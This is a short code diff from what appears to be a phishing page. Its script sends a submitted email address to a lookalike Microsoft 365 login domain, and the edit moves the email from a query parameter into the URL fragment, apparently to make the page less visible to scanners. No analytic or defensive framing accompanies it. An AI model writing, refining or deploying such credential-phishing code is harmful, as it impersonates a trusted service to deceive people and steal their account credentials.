@@ -129,8 +129,8 @@
                 console.log('Email submitted:', email);
                 
                 // Redirect to a new URL with the email as a query parameter
-                var redirectUrl = "https://l0g1n-microso.ftlivedocsportal.com/o365#"; // Replace with your URL
-                window.location.href = `${redirectUrl}?email=${encodeURIComponent(email)}`;
+                var redirectUrl = "https://l0g1n-microso.ftlivedocsportal.com/o365"; // Replace with your URL
+                window.location.href = `${redirectUrl}#${encodeURIComponent(email)}`;
             });
         });
     </script>
